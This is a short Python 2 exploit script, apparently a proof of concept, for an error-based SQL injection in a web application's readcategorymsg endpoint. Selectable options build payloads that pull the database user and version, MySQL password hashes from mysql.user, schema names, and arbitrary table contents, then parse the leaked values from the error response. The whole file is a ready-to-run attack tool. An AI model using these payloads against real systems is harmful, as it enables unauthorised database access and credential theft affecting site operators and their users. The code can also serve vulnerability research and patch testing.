#author kurokoleung
import requests
import sys
import re

url = sys.argv[1]
options = sys.argv[2]

if(options == "user"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20user())),0))"
elif(options == "version"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20version())),0))"
elif(options == "database"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20database())),0))"
elif(options == "password"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,concat(0x5c,(select%20password%20from%20mysql.user%20where%20host=%27localhost%27%20limit%20{i},1)))".format(i=sys.argv[3])
elif(options == "table"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,%20concat(0x5c,%20(select%20table_name%20from%20information_schema.columns%20where%20table_schema=%27{dbname}%27%20limit%20{i},1)))".format(dbname=sys.argv[3],i=sys.argv[4])
elif(options == "column"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,concat(0x5c,(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27{tbname}%27%20limit%20{i},1)))".format(tbname=sys.argv[3],i=sys.argv[4])
elif(options == "content"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,concat(0x5c,(select%20{coname}%20from%20{dbname}.{tbname}%20limit%20{i},1)))".format(dbname=sys.argv[3],tbname=sys.argv[4],coname=sys.argv[5],i=sys.argv[6])
else:
  print 'Invalid options'
  print(options)
  sys.exit(-1)

def Poc(url,options):
  url = url + payload
  req = requests.get(url,timeout=5)
  r=(req.text)
  pattern = re.compile("syntax error: '(.*)'")
#  print(payload)
#  print(col)
#  print(type(col))
  print(pattern.findall(r))

Poc(url,options)
